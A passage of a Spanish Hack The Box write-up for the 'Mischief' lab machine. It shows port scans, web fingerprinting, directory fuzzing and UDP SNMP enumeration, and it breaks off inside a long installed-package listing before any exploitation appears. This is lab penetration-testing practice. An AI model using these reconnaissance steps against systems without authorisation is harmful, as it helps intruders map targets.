---
layout: single
title: Mischief - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Mischief de la plataforma de Hackthebox la cual vamos a estar usando IPv6 para obtener una reverse shell y enumerar muchas cosas de la maquina también vamos a tener que aplicar un escaneo por UDP para descubrir y enumerar el servicio SNMP donde encontraremos que por IPv6 se esta corriendo un servicio web y gracias a que podemos ejecutar comandos vamos a ganar acceso por IPv6 ya que por IPv4 no se puede ademas vamos a obtener credenciales para conectarnos por SSH gracias ah que hay un Information Leakage para la escalada de privilegios podremos usar una credencial que encontraremos para conectarnos directamente como root y también podremos enviarnos una reverse shell por IPv6 como root"
date: 2023-06-28
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-mischief/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - SNMP Enumeration
  - IPV6
  - OS Command Injection
  - Firewall Bypass
---

<p align="center">
<img src="/assets/images/htb-writeup-mischief/banner.png">
</p>

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.10.92
PING 10.10.10.92 (10.10.10.92) 56(84) bytes of data.
64 bytes from 10.10.10.92: icmp_seq=1 ttl=63 time=98.5 ms

--- 10.10.10.92 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 98.458/98.458/98.458/0.000 ms
❯ whichSystem.py 10.10.10.92

10.10.10.92 (ttl -> 63): Linux
```

## PortScan 

- [nrunscan](https://github.com/MikeRega7/nrunscan)

```bash
❯ ./nrunscan.sh -i
 Give me the IP target: 10.10.10.92

Starting the scan with nmap
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 12:51 CST
Initiating SYN Stealth Scan at 12:51
Scanning 10.10.10.92 [65535 ports]
Discovered open port 22/tcp on 10.10.10.92
Discovered open port 3366/tcp on 10.10.10.92
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.10.92, 16) => Operation not permitted
Offending packet: TCP 10.10.14.12:64204 > 10.10.10.92:6203 S ttl=58 id=36595 iplen=44  seq=3080013800 win=1024 <mss 1460>
Completed SYN Stealth Scan at 12:51, 26.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.92
Host is up, received user-set (0.099s latency).
Scanned at 2023-06-27 12:51:31 CST for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
3366/tcp open  creativepartnr syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 21 (924B)

[*] Extracting information...

	[*] IP Target: 10.10.10.92
	[*] Open Ports:  22,3366

[*] Ports copied to clipboard


Escaning the services and technologies in the ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 12:51 CST
Nmap scan report for 10.10.10.92
Host is up (0.099s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a90a6b1e633850715b2eea7b9467752 (RSA)
|   256 d0d7007c3bb0a632b229178d69a6843f (ECDSA)
|_  256 3f1c77935cc06cea26f4bb6c59e97cb0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html).
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.16 seconds

[+]...If another port run a http server you can use the script http-enum of nmap

[+]...Example nmap --script http-enum -p {ports} {ip}

[*] Port 80 and 8080 are not open, exiting...


Thanks for using the script! Happy Hacking
```

## Enumeracion

Solo tenemos 2 puertos abiertos el **22** que corresponde a **SSH** y tenemos otro puerto que corre que no se que sea eso **caldav** al parecer es un servicio **HTTP** **SimpleHTTP/0.6 Python/2.7.15rc1**

Bueno ya vemos lo que es y si es correcto ya que en el escaneo de **Nmap** nos decían **Radicale calendar and contacts server** 

![](/assets/images/htb-writeup-mischief/web1.png)

Al parecer habrá un panel de **login**

![](/assets/images/htb-writeup-mischief/web2.png)

Bueno si pruebas credenciales por defecto como **admin:admin** **guest:guest** o **root:root** no son correctas y le damos al botón de **cancel** nos sale esto una cadena en **base64**

![](/assets/images/htb-writeup-mischief/web3.png)

Si le aplicamos un **decode** básicamente esta convirtiendo las credenciales que le pasamos en **base64**

```bash
❯ echo "YWRtaW46YWRtaW4=" | base64 -d; echo
admin:admin
```

# Reconocimiento

Si vemos las tecnologías que esta corriendo vemos las siguientes

```ruby
❯ whatweb http://10.10.10.92:3366
http://10.10.10.92:3366 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.15rc1], IP[10.10.10.92], Python[2.7.15rc1], WWW-Authenticate[Test][Basic]
```

Pues bueno poca cosa lo que podemos hacer es aplicar **fuzzing** para ver si hay algo pero no creo que sea buena idea ya que casi siempre en estos casos todo lo que pongas te va a redirigir al panel de login de igual forma podemos hacerlo para comprobarlo

```bash
❯ dirsearch -u http://10.10.10.92:3366

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.92:3366/_23-06-27_13-18-32.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-27_13-18-32.log

Target: http://10.10.10.92:3366/

[13:18:32] Starting: 

Task Completed
```

## PortScan UDP

Como no encontramos nada por **TCP** vamos a hacer un escaneo de puertos pero por el protocolo **UDP**

![](/assets/images/htb-writeup-mischief/web4.png)

```bash
❯ nmap -sU --top-ports 500 -v -n 10.10.10.92
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 13:23 CST
Initiating Ping Scan at 13:23
Scanning 10.10.10.92 [4 ports]
Completed Ping Scan at 13:23, 0.11s elapsed (1 total hosts)
Initiating UDP Scan at 13:23
Scanning 10.10.10.92 [500 ports]
Discovered open port 161/udp on 10.10.10.92
Completed UDP Scan at 13:24, 25.14s elapsed (500 total ports)
Nmap scan report for 10.10.10.92
Host is up (0.094s latency).
Not shown: 499 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 25.38 seconds
           Raw packets sent: 1038 (49.873KB) | Rcvd: 7 (901B)
```

El escaneo lo hicimos indicándole que queremos que nos escanee los **500** puertos mas comunes y solo vemos un puerto abierto que es el del servicio **snmp** que ya lo hemos visto en otras maquinas así que ahora haremos un escaneo para ver mas información del servicio.
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce>

```bash
❯ nmap -sCV -p161 -sU 10.10.10.92 -oN targeted2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 13:33 CST
Nmap scan report for 10.10.10.92
Host is up (0.096s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-win32-software: 
|   accountsservice-0.6.45-1ubuntu1; 0-01-01T00:00:00
|   acl-2.2.52-3build1; 0-01-01T00:00:00
|   acpid-1:2.0.28-1ubuntu1; 0-01-01T00:00:00
|   adduser-3.116ubuntu1; 0-01-01T00:00:00
|   apache2-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apache2-bin-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apache2-data-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apache2-utils-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apparmor-2.12-4ubuntu5; 0-01-01T00:00:00
|   apport-2.20.9-0ubuntu7; 0-01-01T00:00:00
|   apport-symptoms-0.20; 0-01-01T00:00:00
|   apt-1.6.1; 0-01-01T00:00:00
|   apt-utils-1.6.1; 0-01-01T00:00:00
|   at-3.1.20-3.1ubuntu2; 0-01-01T00:00:00
|   base-files-10.1ubuntu2; 0-01-01T00:00:00
|   base-passwd-3.5.44; 0-01-01T00:00:00
|   bash-4.4.18-2ubuntu1; 0-01-01T00:00:00
|   bash-completion-1:2.8-1ubuntu1; 0-01-01T00:00:00
|   bc-1.07.1-2; 0-01-01T00:00:00
|   bcache-tools-1.0.8-2build1; 0-01-01T00:00:00
|   bind9-host-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   binutils-2.30-15ubuntu1; 0-01-01T00:00:00
|   binutils-common-2.30-15ubuntu1; 0-01-01T00:00:00
|   binutils-x86-64-linux-gnu-2.30-15ubuntu1; 0-01-01T00:00:00
|   bsdmainutils-11.1.2ubuntu1; 0-01-01T00:00:00
|   bsdutils-1:2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   btrfs-progs-4.15.1-1build1; 0-01-01T00:00:00
|   btrfs-tools-4.15.1-1build1; 0-01-01T00:00:00
|   build-essential-12.4ubuntu1; 0-01-01T00:00:00
|   busybox-initramfs-1:1.27.2-2ubuntu3; 0-01-01T00:00:00
|   busybox-static-1:1.27.2-2ubuntu3; 0-01-01T00:00:00
|   byobu-5.125-0ubuntu1; 0-01-01T00:00:00
|   bzip2-1.0.6-8.1; 0-01-01T00:00:00
|   ca-certificates-20180409; 0-01-01T00:00:00
|   cloud-guest-utils-0.30-0ubuntu5; 0-01-01T00:00:00
|   cloud-init-18.2-14-g6d48d265-0ubuntu1; 0-01-01T00:00:00
|   cloud-initramfs-copymods-0.40ubuntu1; 0-01-01T00:00:00
|   cloud-initramfs-dyn-netconf-0.40ubuntu1; 0-01-01T00:00:00
|   command-not-found-18.04.4; 0-01-01T00:00:00
|   command-not-found-data-18.04.4; 0-01-01T00:00:00
|   console-setup-1.178ubuntu2; 0-01-01T00:00:00
|   console-setup-linux-1.178ubuntu2; 0-01-01T00:00:00
|   coreutils-8.28-1ubuntu1; 0-01-01T00:00:00
|   cpio-2.12+dfsg-6; 0-01-01T00:00:00
|   cpp-4:7.3.0-3ubuntu2; 0-01-01T00:00:00
|   cpp-7-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   crda-3.18-1build1; 0-01-01T00:00:00
|   cron-3.0pl1-128.1ubuntu1; 0-01-01T00:00:00
|   cryptsetup-2:2.0.2-1ubuntu1; 0-01-01T00:00:00
|   cryptsetup-bin-2:2.0.2-1ubuntu1; 0-01-01T00:00:00
|   curl-7.58.0-2ubuntu3; 0-01-01T00:00:00
|   dash-0.5.8-2.10; 0-01-01T00:00:00
|   dbus-1.12.2-1ubuntu1; 0-01-01T00:00:00
|   debconf-1.5.66; 0-01-01T00:00:00
|   debconf-i18n-1.5.66; 0-01-01T00:00:00
|   debianutils-4.8.4; 0-01-01T00:00:00
|   diffutils-1:3.6-1; 0-01-01T00:00:00
|   dirmngr-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   distro-info-data-0.37ubuntu0.1; 0-01-01T00:00:00
|   dmeventd-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   dmidecode-3.1-1; 0-01-01T00:00:00
|   dmsetup-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   dns-root-data-2018013001; 0-01-01T00:00:00
|   dnsmasq-base-2.79-1; 0-01-01T00:00:00
|   dnsutils-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   dosfstools-4.1-1; 0-01-01T00:00:00
|   dpkg-1.19.0.5ubuntu2; 0-01-01T00:00:00
|   dpkg-dev-1.19.0.5ubuntu2; 0-01-01T00:00:00
|   e2fsprogs-1.44.1-1; 0-01-01T00:00:00
|   eatmydata-105-6; 0-01-01T00:00:00
|   ebtables-2.0.10.4-3.5ubuntu2; 0-01-01T00:00:00
|   ed-1.10-2.1; 0-01-01T00:00:00
|   eject-2.1.5+deb1+cvs20081104-13.2; 0-01-01T00:00:00
|   ethtool-1:4.15-0ubuntu1; 0-01-01T00:00:00
|   fakeroot-1.22-2ubuntu1; 0-01-01T00:00:00
|   fdisk-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   file-1:5.32-2; 0-01-01T00:00:00
|   findutils-4.6.0+git+20170828-2; 0-01-01T00:00:00
|   fonts-ubuntu-console-0.83-2; 0-01-01T00:00:00
|   friendly-recovery-0.2.38; 0-01-01T00:00:00
|   ftp-0.17-34; 0-01-01T00:00:00
|   fuse-2.9.7-1ubuntu1; 0-01-01T00:00:00
|   g++-4:7.3.0-3ubuntu2; 0-01-01T00:00:00
|   g++-7-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   gawk-1:4.1.4+dfsg-1build1; 0-01-01T00:00:00
|   gcc-4:7.3.0-3ubuntu2; 0-01-01T00:00:00
|   gcc-7-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   gcc-7-base-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   gcc-8-base-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   gdisk-1.0.3-1; 0-01-01T00:00:00
|   geoip-database-20180315-1; 0-01-01T00:00:00
|   gettext-base-0.19.8.1-6; 0-01-01T00:00:00
|   gir1.2-glib-2.0-1.56.1-1; 0-01-01T00:00:00
|   git-1:2.17.0-1ubuntu1; 0-01-01T00:00:00
|   git-man-1:2.17.0-1ubuntu1; 0-01-01T00:00:00
|   gnupg-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gnupg-l10n-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gnupg-utils-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-agent-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-wks-client-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-wks-server-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpgconf-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpgsm-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpgv-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   grep-3.1-2; 0-01-01T00:00:00
|   groff-base-1.22.3-10; 0-01-01T00:00:00
|   grub-common-2.02-2ubuntu8; 0-01-01T00:00:00
|   grub-gfxpayload-lists-0.7; 0-01-01T00:00:00
|   grub-legacy-ec2-1:1; 0-01-01T00:00:00
|   grub-pc-2.02-2ubuntu8; 0-01-01T00:00:00
|   grub-pc-bin-2.02-2ubuntu8; 0-01-01T00:00:00
|   grub2-common-2.02-2ubuntu8; 0-01-01T00:00:00
|   gzip-1.6-5ubuntu1; 0-01-01T00:00:00
|   hdparm-9.54+ds-1; 0-01-01T00:00:00
|   hostname-3.20; 0-01-01T00:00:00
|   htop-2.1.0-3; 0-01-01T00:00:00
|   info-6.5.0.dfsg.1-2; 0-01-01T00:00:00
|   init-1.51; 0-01-01T00:00:00
|   init-system-helpers-1.51; 0-01-01T00:00:00
|   initramfs-tools-0.130ubuntu3; 0-01-01T00:00:00
|   initramfs-tools-bin-0.130ubuntu3; 0-01-01T00:00:00
|   initramfs-tools-core-0.130ubuntu3; 0-01-01T00:00:00
|   install-info-6.5.0.dfsg.1-2; 0-01-01T00:00:00
|   iproute2-4.15.0-2ubuntu1; 0-01-01T00:00:00
|   iptables-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   iptables-persistent-1.0.4+nmu2; 0-01-01T00:00:00
|   iputils-ping-3:20161105-1ubuntu2; 0-01-01T00:00:00
|   iputils-tracepath-3:20161105-1ubuntu2; 0-01-01T00:00:00
|   irqbalance-1.3.0-0.1; 0-01-01T00:00:00
|   isc-dhcp-client-4.3.5-3ubuntu7; 0-01-01T00:00:00
|   isc-dhcp-common-4.3.5-3ubuntu7; 0-01-01T00:00:00
|   iso-codes-3.79-1; 0-01-01T00:00:00
|   iw-4.14-0.1; 0-01-01T00:00:00
|   kbd-2.0.4-2ubuntu1; 0-01-01T00:00:00
|   keyboard-configuration-1.178ubuntu2; 0-01-01T00:00:00
|   klibc-utils-2.0.4-9ubuntu2; 0-01-01T00:00:00
|   kmod-24-1ubuntu3; 0-01-01T00:00:00
|   krb5-locales-1.16-2build1; 0-01-01T00:00:00
|   landscape-common-18.01-0ubuntu3; 0-01-01T00:00:00
|   language-selector-common-0.188; 0-01-01T00:00:00
|   less-487-0.1; 0-01-01T00:00:00
|   libaccountsservice0-0.6.45-1ubuntu1; 0-01-01T00:00:00
|   libacl1-2.2.52-3build1; 0-01-01T00:00:00
|   libaio1-0.3.110-5; 0-01-01T00:00:00
|   libalgorithm-diff-perl-1.19.03-1; 0-01-01T00:00:00
|   libalgorithm-diff-xs-perl-0.04-5; 0-01-01T00:00:00
|   libalgorithm-merge-perl-0.08-3; 0-01-01T00:00:00
|   libapache2-mod-php-1:7.2+60ubuntu1; 0-01-01T00:00:00
|   libapache2-mod-php7.2-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   libapparmor1-2.12-4ubuntu5; 0-01-01T00:00:00
|   libapr1-1.6.3-2; 0-01-01T00:00:00
|   libaprutil1-1.6.1-2; 0-01-01T00:00:00
|   libaprutil1-dbd-sqlite3-1.6.1-2; 0-01-01T00:00:00
|   libaprutil1-ldap-1.6.1-2; 0-01-01T00:00:00
|   libapt-inst2.0-1.6.1; 0-01-01T00:00:00
|   libapt-pkg5.0-1.6.1; 0-01-01T00:00:00
|   libargon2-0-0~20161029-1.1; 0-01-01T00:00:00
|   libasan4-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libasn1-8-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libassuan0-2.5.1-2; 0-01-01T00:00:00
|   libatm1-1:2.5.1-2build1; 0-01-01T00:00:00
|   libatomic1-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libattr1-1:2.4.47-2build1; 0-01-01T00:00:00
|   libaudit-common-1:2.8.2-1ubuntu1; 0-01-01T00:00:00
|   libaudit1-1:2.8.2-1ubuntu1; 0-01-01T00:00:00
|   libbind9-160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libbinutils-2.30-15ubuntu1; 0-01-01T00:00:00
|   libblkid1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libbsd0-0.8.7-1; 0-01-01T00:00:00
|   libbz2-1.0-1.0.6-8.1; 0-01-01T00:00:00
|   libc-bin-2.27-3ubuntu1; 0-01-01T00:00:00
|   libc-dev-bin-2.27-3ubuntu1; 0-01-01T00:00:00
|   libc6-2.27-3ubuntu1; 0-01-01T00:00:00
|   libc6-dev-2.27-3ubuntu1; 0-01-01T00:00:00
|   libcap-ng0-0.7.7-3.1; 0-01-01T00:00:00
|   libcap2-1:2.25-1.2; 0-01-01T00:00:00
|   libcap2-bin-1:2.25-1.2; 0-01-01T00:00:00
|   libcc1-0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libcgi-fast-perl-1:2.13-1; 0-01-01T00:00:00
|   libcgi-pm-perl-4.38-1; 0-01-01T00:00:00
|   libcilkrts5-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libcom-err2-1.44.1-1; 0-01-01T00:00:00
|   libcryptsetup12-2:2.0.2-1ubuntu1; 0-01-01T00:00:00
|   libcurl3-gnutls-7.58.0-2ubuntu3; 0-01-01T00:00:00
|   libcurl4-7.58.0-2ubuntu3; 0-01-01T00:00:00
|   libdb5.3-5.3.28-13.1ubuntu1; 0-01-01T00:00:00
|   libdbus-1-3-1.12.2-1ubuntu1; 0-01-01T00:00:00
|   libdbus-glib-1-2-0.110-2; 0-01-01T00:00:00
|   libdebconfclient0-0.213ubuntu1; 0-01-01T00:00:00
|   libdevmapper-event1.02.1-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   libdevmapper1.02.1-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   libdns-export1100-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libdns1100-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libdpkg-perl-1.19.0.5ubuntu2; 0-01-01T00:00:00
|   libdrm-common-2.4.91-2; 0-01-01T00:00:00
|   libdrm2-2.4.91-2; 0-01-01T00:00:00
|   libdumbnet1-1.12-7build1; 0-01-01T00:00:00
|   libeatmydata1-105-6; 0-01-01T00:00:00
|   libedit2-3.1-20170329-1; 0-01-01T00:00:00
|   libelf1-0.170-0.4; 0-01-01T00:00:00
|   libencode-locale-perl-1.05-1; 0-01-01T00:00:00
|   liberror-perl-0.17025-1; 0-01-01T00:00:00
|   libestr0-0.1.10-2.1; 0-01-01T00:00:00
|   libevent-2.1-6-2.1.8-stable-4build1; 0-01-01T00:00:00
|   libevent-core-2.1-6-2.1.8-stable-4build1; 0-01-01T00:00:00
|   libexpat1-2.2.5-3; 0-01-01T00:00:00
|   libexpat1-dev-2.2.5-3; 0-01-01T00:00:00
|   libext2fs2-1.44.1-1; 0-01-01T00:00:00
|   libfakeroot-1.22-2ubuntu1; 0-01-01T00:00:00
|   libfastjson4-0.99.8-2; 0-01-01T00:00:00
|   libfcgi-perl-0.78-2build1; 0-01-01T00:00:00
|   libfdisk1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libffi6-3.2.1-8; 0-01-01T00:00:00
|   libfile-fcntllock-perl-0.22-3build2; 0-01-01T00:00:00
|   libfreetype6-2.8.1-2ubuntu2; 0-01-01T00:00:00
|   libfribidi0-0.19.7-2; 0-01-01T00:00:00
|   libfuse2-2.9.7-1ubuntu1; 0-01-01T00:00:00
|   libgcc-7-dev-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libgcc1-1:8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libgcrypt20-1.8.1-4ubuntu1; 0-01-01T00:00:00
|   libgdbm-compat4-1.14.1-6; 0-01-01T00:00:00
|   libgdbm5-1.14.1-6; 0-01-01T00:00:00
|   libgeoip1-1.6.12-1; 0-01-01T00:00:00
|   libgirepository-1.0-1-1.56.1-1; 0-01-01T00:00:00
|   libglib2.0-0-2.56.1-2ubuntu1; 0-01-01T00:00:00
|   libglib2.0-data-2.56.1-2ubuntu1; 0-01-01T00:00:00
|   libgmp10-2:6.1.2+dfsg-2; 0-01-01T00:00:00
|   libgnutls30-3.5.18-1ubuntu1; 0-01-01T00:00:00
|   libgomp1-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libgpg-error0-1.27-6; 0-01-01T00:00:00
|   libgpm2-1.20.7-5; 0-01-01T00:00:00
|   libgssapi-krb5-2-1.16-2build1; 0-01-01T00:00:00
|   libgssapi3-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libhcrypto4-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libheimbase1-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libheimntlm0-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libhogweed4-3.4-1; 0-01-01T00:00:00
|   libhtml-parser-perl-3.72-3build1; 0-01-01T00:00:00
|   libhtml-tagset-perl-3.20-3; 0-01-01T00:00:00
|   libhtml-template-perl-2.97-1; 0-01-01T00:00:00
|   libhttp-date-perl-6.02-1; 0-01-01T00:00:00
|   libhttp-message-perl-6.14-1; 0-01-01T00:00:00
|   libhx509-5-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libicu60-60.2-3ubuntu3; 0-01-01T00:00:00
|   libidn11-1.33-2.1ubuntu1; 0-01-01T00:00:00
|   libidn2-0-2.0.4-1.1build2; 0-01-01T00:00:00
|   libio-html-perl-1.001-1; 0-01-01T00:00:00
|   libip4tc0-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libip6tc0-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libiptc0-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libirs160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisc-export169-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisc169-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisccc160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisccfg160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisl19-0.19-1; 0-01-01T00:00:00
|   libisns0-0.97-2build1; 0-01-01T00:00:00
|   libitm1-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libjson-c3-0.12.1-1.3; 0-01-01T00:00:00
|   libk5crypto3-1.16-2build1; 0-01-01T00:00:00
|   libkeyutils1-1.5.9-9.2ubuntu2; 0-01-01T00:00:00
|   libklibc-2.0.4-9ubuntu2; 0-01-01T00:00:00
|   libkmod2-24-1ubuntu3; 0-01-01T00:00:00
|   libkrb5-26-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libkrb5-3-1.16-2build1; 0-01-01T00:00:00
|   libkrb5support0-1.16-2build1; 0-01-01T00:00:00
|   libksba8-1.3.5-2; 0-01-01T00:00:00
|   libldap-2.4-2-2.4.45+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libldap-common-2.4.45+dfsg-1ubuntu1; 0-01-01T00:00:00
|   liblocale-gettext-perl-1.07-3build2; 0-01-01T00:00:00
|   liblsan0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   liblua5.2-0-5.2.4-1.1build1; 0-01-01T00:00:00
|   liblvm2app2.2-2.02.176-4.1ubuntu3; 0-01-01T00:00:00
|   liblvm2cmd2.02-2.02.176-4.1ubuntu3; 0-01-01T00:00:00
|   liblwp-mediatypes-perl-6.02-1; 0-01-01T00:00:00
|   liblwres160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   liblxc-common-3.0.0-0ubuntu2; 0-01-01T00:00:00
|   liblxc1-3.0.0-0ubuntu2; 0-01-01T00:00:00
|   liblz4-1-0.0~r131-2ubuntu3; 0-01-01T00:00:00
|   liblzma5-5.2.2-1.3; 0-01-01T00:00:00
|   liblzo2-2-2.08-1.2; 0-01-01T00:00:00
|   libmagic-mgc-1:5.32-2; 0-01-01T00:00:00
|   libmagic1-1:5.32-2; 0-01-01T00:00:00
|   libmnl0-1.0.4-2; 0-01-01T00:00:00
|   libmount1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libmpc3-1.1.0-1; 0-01-01T00:00:00
|   libmpdec2-2.4.2-1ubuntu1; 0-01-01T00:00:00
|   libmpfr6-4.0.1-1; 0-01-01T00:00:00
|   libmpx2-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libmspack0-0.6-3; 0-01-01T00:00:00
|   libncurses5-6.1-1ubuntu1; 0-01-01T00:00:00
|   libncursesw5-6.1-1ubuntu1; 0-01-01T00:00:00
|   libnetfilter-conntrack3-1.0.6-2; 0-01-01T00:00:00
|   libnettle6-3.4-1; 0-01-01T00:00:00
|   libnewt0.52-0.52.20-1ubuntu1; 0-01-01T00:00:00
|   libnfnetlink0-1.0.1-3; 0-01-01T00:00:00
|   libnghttp2-14-1.30.0-1ubuntu1; 0-01-01T00:00:00
|   libnih1-1.0.3-6ubuntu2; 0-01-01T00:00:00
|   libnl-3-200-3.2.29-0ubuntu3; 0-01-01T00:00:00
|   libnl-genl-3-200-3.2.29-0ubuntu3; 0-01-01T00:00:00
|   libnpth0-1.5-3; 0-01-01T00:00:00
|   libnss-systemd-237-3ubuntu10; 0-01-01T00:00:00
|   libntfs-3g88-1:2017.3.23-2; 0-01-01T00:00:00
|   libnuma1-2.0.11-2.1; 0-01-01T00:00:00
|   libp11-kit0-0.23.9-2; 0-01-01T00:00:00
|   libpam-cap-1:2.25-1.2; 0-01-01T00:00:00
|   libpam-modules-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
|   libpam-modules-bin-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
|   libpam-runtime-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
|   libpam-systemd-237-3ubuntu10; 0-01-01T00:00:00
|   libpam0g-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
|   libparted2-3.2-20; 0-01-01T00:00:00
|   libpcap0.8-1.8.1-6ubuntu1; 0-01-01T00:00:00
|   libpci3-1:3.5.2-1ubuntu1; 0-01-01T00:00:00
|   libpcre3-2:8.39-9; 0-01-01T00:00:00
|   libperl5.26-5.26.1-6; 0-01-01T00:00:00
|   libpipeline1-1.5.0-1; 0-01-01T00:00:00
|   libplymouth4-0.9.3-1ubuntu7; 0-01-01T00:00:00
|   libpng16-16-1.6.34-1; 0-01-01T00:00:00
|   libpolkit-agent-1-0-0.105-20; 0-01-01T00:00:00
|   libpolkit-backend-1-0-0.105-20; 0-01-01T00:00:00
|   libpolkit-gobject-1-0-0.105-20; 0-01-01T00:00:00
|   libpopt0-1.16-11; 0-01-01T00:00:00
|   libprocps6-2:3.3.12-3ubuntu1; 0-01-01T00:00:00
|   libpsl5-0.19.1-5build1; 0-01-01T00:00:00
|   libpython-all-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython-stdlib-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython2.7-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython2.7-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython2.7-minimal-2.7.15~rc1-1; 0-01-01T00:00:00
